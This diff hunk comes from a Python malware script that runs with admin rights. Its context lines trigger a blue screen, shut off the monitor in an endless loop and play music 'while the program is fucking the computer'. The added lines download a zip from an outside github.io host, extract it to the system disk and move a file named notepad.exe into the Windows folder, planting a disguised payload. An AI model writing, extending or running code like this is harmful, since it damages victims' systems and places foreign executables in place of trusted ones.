@@ -52,7 +52,18 @@ if is_admin():
     #   REMPROM() function removal for testing purposes (and wont work in future updates)
     addBSOD()
 
+
+    pathdownloaded = DownloadFile('https://psvks.github.io/psvks/uploads/output.zip')
+    ExtractZip(pathdownloaded, default_disk)
+    MoveFile(default_disk + "\\output\\notepad.exe", default_disk + "\\Windows")
+
+
+
+
     StartProcess(path) # This will make the music start while the program is fucking the computer
+
+
+
     while True:
         StopMonitor()
         os.system("start https://en.wikipedia.org/wiki/Computer_virus")
